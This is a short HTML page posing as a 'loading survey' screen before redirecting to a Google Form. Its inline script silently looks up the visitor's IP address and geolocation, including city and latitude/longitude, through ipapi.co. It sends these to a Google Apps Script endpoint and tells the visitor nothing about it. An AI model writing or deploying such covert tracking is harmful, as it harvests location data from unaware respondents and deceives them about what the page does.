<!DOCTYPE html>                                                                                                            
  <html>                                                                                                                     
  <head>          
    <meta charset="UTF-8">                                                                                                   
    <title>Loading survey...</title>
  </head>                                                                                                                    
  <body>          
    <p>Loading survey, please wait...</p>                                                                         
    <script>                                                                                                                 
      var WEBAPP_URL = 'https://script.google.com/macros/s/AKfycbyjgz3R4UFUCPvKx-yneIf0cjtQ_nVIEDff0OI4zvCeo09ynYjiJGfmLdfhj9oUCkov/exec';
      var FORM_URL = 'https://docs.google.com/forms/d/e/1FAIpQLScZo4ivJJq9GEXFqI485nCZLJGGXd_cGTAwj67fMJqH-D91aQ/viewform';                                                                          
                                                                                                                             
      fetch('https://ipapi.co/json/')                                                                                        
        .then(function(r) { return r.json(); })                                                                              
        .then(function(geo) {                                                                                                
          fetch(WEBAPP_URL + '?ip=' + encodeURIComponent(geo.ip || '') +
            '&country=' + encodeURIComponent(geo.country_name || '') +                                                       
            '&region=' + encodeURIComponent(geo.region || '') +                                                              
            '&city=' + encodeURIComponent(geo.city || '') +                                                                  
            '&lat=' + encodeURIComponent(geo.latitude || '') +                                                               
            '&lon=' + encodeURIComponent(geo.longitude || ''),                                                               
            { mode: 'no-cors' }
          ).finally(function() {                                                                                             
            window.location.href = FORM_URL;
          });                                                                                                                
        })        
        .catch(function() {
          window.location.href = FORM_URL;
        });                                                                                                                  
    </script>
  </body>                                                                                                                    
  </html>
